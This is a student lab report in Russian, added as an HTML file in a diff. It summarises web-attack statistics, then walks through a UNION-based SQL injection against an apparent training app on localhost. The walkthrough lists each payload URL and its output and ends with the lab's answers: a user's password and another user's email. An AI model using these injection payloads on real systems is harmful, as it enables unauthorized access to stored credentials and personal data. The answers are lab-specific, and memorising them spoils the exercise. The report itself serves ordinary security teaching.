@@ -1,0 +1,136 @@
+<html><head><style>body {
+   color: black;
+}
+</style></head><body><h1 id="-1">Лабораторная работа №1</h1>
+<h2 id="-i">Часть I</h2>
+<h3 id="1-">1. Источники</h3>
+<ol>
+<li>Positive Technologies — «CODE RED 2026: Актуальные киберугрозы для российских организаций»<br><a href="https://ptsecurity.com/research/analytics/russia-cyberthreat-landscape-2026/">https://ptsecurity.com/research/analytics/russia-cyberthreat-landscape-2026/</a></li>
+<li>RED Security — аналитика SOC 
+<a href="https://cisoclub.ru/analitika-red-security-soc-tret-vseh-vzlomov-pr/">https://cisoclub.ru/analitika-red-security-soc-tret-vseh-vzlomov-pr/</a></li>
+<li><p>ComNews / «Вебмониторэкс» — «Российские компании отразили 600 млн веб-атак» (2025)<br><a href="https://www.comnews.ru/content/240386/2025-07-28/2025-w31/1008/rossiyskie-kompanii-otrazili-600-mln-veb-atak">https://www.comnews.ru/content/240386/2025-07-28/2025-w31/1008/rossiyskie-kompanii-otrazili-600-mln-veb-atak</a></p>
+</li>
+<li><p>Astra — Cyber Security Vulnerability Statistics 2026<br><a href="https://www.getastra.com/blog/security-audit/cyber-security-vulnerability-statistics/">https://www.getastra.com/blog/security-audit/cyber-security-vulnerability-statistics/</a></p>
+</li>
+</ol>
+<h3 id="2-">2. Доля успешных атак с помощью эксплуатации веб-уязвимостей</h3>
+<ol>
+<li>50% успешных взломов (RED Security) связаны с уязвимостями веб-приложений.</li>
+<li>Доля веб-атак в госсекторе составляет 11%, в IT-компаниях — 9% (Positive Technologies).</li>
+</ol>
+<h3 id="3-">3. Распределение по конкретным уязвимостям</h3>
+<p>Согласно данным OWASP Top 10 (Astra), наиболее распространёнными типами уязвимостей в веб-приложениях являются:</p>
+<table>
+<thead>
+<tr>
+<th>Тип уязвимости</th>
+<th>Доля приложений, содержащих уязвимость</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Broken Access Control</td>
+<td>3.81%</td>
+</tr>
+<tr>
+<td>Injection</td>
+<td>3.37%</td>
+</tr>
+<tr>
+<td>Security Misconfiguration</td>
+<td>4.50%</td>
+</tr>
+</tbody>
+</table>
+<p>По данным &quot;Вебмониторэкс&quot;:</p>
+<table>
+<thead>
+<tr>
+<th>Тип атаки</th>
+<th>Доля от общего числа веб-атак</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>XSS (межсайтовый скриптинг)</td>
+<td>25%</td>
+</tr>
+<tr>
+<td>RCE (удалённое исполнение кода)</td>
+<td>14%</td>
+</tr>
+<tr>
+<td>Path Traversal (обход путей)</td>
+<td>11%</td>
+</tr>
+<tr>
+<td>Прочие типы</td>
+<td>50%</td>
+</tr>
+</tbody>
+</table>
+<h2 id="-ii">Часть II</h2>
+<h3 id="-">Поиск пользователей</h3>
+<p>На странице <code>http://localhost:8080/task/</code> было сказано ввести параметр id. Переберём id от 1, пока не найдём нужных пользователей. Результаты:</p>
+<p><code>http://localhost:8080/task/?id=1</code> Ваш id:1 Ваш логин:admin</p>
+<p>...</p>
+<p><code>http://localhost:8080/task/?id=4</code> Ваш id:4 Ваш логин:Vinni-pukh</p>
+<p>...</p>
+<p><code>http://localhost:8080/task/?id=9</code> Ваш id:9 Ваш логин:Volk2</p>
+<p><code>http://localhost:8080/task/?id=10</code> Здесь и далее пустые страницы.</p>
+<h3 id="-sql-">Проверка на SQL-инъекцию</h3>
+<p>Добавим кавычку в запрос:</p>
+<p><code>http://localhost:8080/task/?id=1&#39;</code></p>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</p>
+<p>Наш ввод попал в запрос и нарушил его структуру – приложение уязвимо для SQL-инъекций.</p>
+<h3 id="-">Определение числа столбцов</h3>
+<p>Для использования UNION нужно знать, сколько столбцов возвращает исходный запрос. Применим ORDER BY, последовательно увеличивая номер:</p>
+<p><code>http://localhost:8080/task/?id=1&#39; ORDER BY 1--+</code> – работает</p>
+<p><code>http://localhost:8080/task/?id=1&#39; ORDER BY 2--+</code> – работает</p>
+<p><code>http://localhost:8080/task/?id=1&#39; ORDER BY 3--+</code> – работает</p>
+<p><code>http://localhost:8080/task/?id=1&#39; ORDER BY 4--+</code> – ошибка Unknown column &#39;4&#39; in &#39;order clause&#39;</p>
+<p>Значит, столбцов - 3.</p>
+<h3 id="-">Определение выводимых колонок</h3>
+<p>Теперь выясним, какие из этих трёх столбцов отображаются на странице. Возьмём заведомо несуществующий id=10, чтобы первая часть запроса ничего не вернула, и подставим свои значения:
+<code>http://localhost:8080/task/?id=10&#39; UNION SELECT 1,2,3--+</code></p>
+<p>Ваш id:1
+Ваш логин:2</p>
+<p>Цифра 3 нигде не появилась – на страницу выводятся только первая и вторая колонки. Третья колонка не видна.</p>
+<h3 id="-">Получение списка таблиц</h3>
+<p>Узнаем, какие таблицы есть в текущей базе данных. Обратимся к information_schema:
+<code>http://localhost:8080/task/?id=10&#39; UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--+</code></p>
+<p>Ваш id:emails
+Ваш логин:2</p>
+<p>Но такой запрос вернул только одну таблицу – видимо, из-за LIMIT 1 в исходном запросе. Чтобы обойти это, используем GROUP_CONCAT, который соберёт все имена в одну строку:</p>
+<p><code>http://localhost:8080/task/?id=10&#39; UNION SELECT GROUP_CONCAT(table_name),2,3 FROM information_schema.tables WHERE table_schema=database()--+</code></p>
+<p>Ваш id:emails,users
+Ваш логин:2. В базе две таблицы.</p>
+<h3 id="-">Получение структуры таблиц</h3>
+<p>Теперь узнаем названия колонок в каждой таблице.</p>
+<p>Для users:</p>
+<p><code>http://localhost:8080/task/?id=10&#39; UNION SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns WHERE table_name=&#39;users&#39;--+</code></p>
+<p>Ваш id:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password
+Ваш логин:2. Нас интересуют id, username, password.</p>
+<p>Для emails:</p>
+<p><code>http://localhost:8080/task/?id=10&#39; UNION SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns WHERE table_name=&#39;emails&#39;--+</code></p>
+<p>Ваш id:id,email_id
+Ваш логин:2. </p>
+<p>Мы получили структуру всех таблиц.</p>
+<h3 id="-volk2">Извлечение пароля Volk2</h3>
+<p>Пробуем вывести данные пользователя с id=9:</p>
+<p><code>http://localhost:8080/task/?id=10&#39; UNION SELECT password,id,username FROM users WHERE id=9--+</code></p>
+<p>Ваш id:Wa spoiuuuuu
+Ваш логин:9</p>
+<p>Пароль найден: <strong>Wa spoiuuuuu</strong>.</p>
+<h3 id="-vinni-pukh">Извлечение почты Vinni-pukh</h3>
+<p>Для Vinni-pukh id=4. Используем таблицу emails:</p>
+<p><code>http://localhost:8080/task/?id=10&#39; UNION SELECT email_id,id,3 FROM emails WHERE id=4--+</code></p>
+<p>Ваш id:honey_lover@otus-lab.com
+Ваш логин:4</p>
+<p>Почта получена: <strong>honey_lover@otus-lab.com</strong>.</p>
+<h3 id="-">Итоговые ответы</h3>
+<ol>
+<li>Пароль пользователя Volk2: <strong>Wa spoiuuuuu</strong></li>
+<li>Почта пользователя Vinni-pukh: <strong>honey_lover@otus-lab.com</strong></li>
+</ol>
+</body></html>
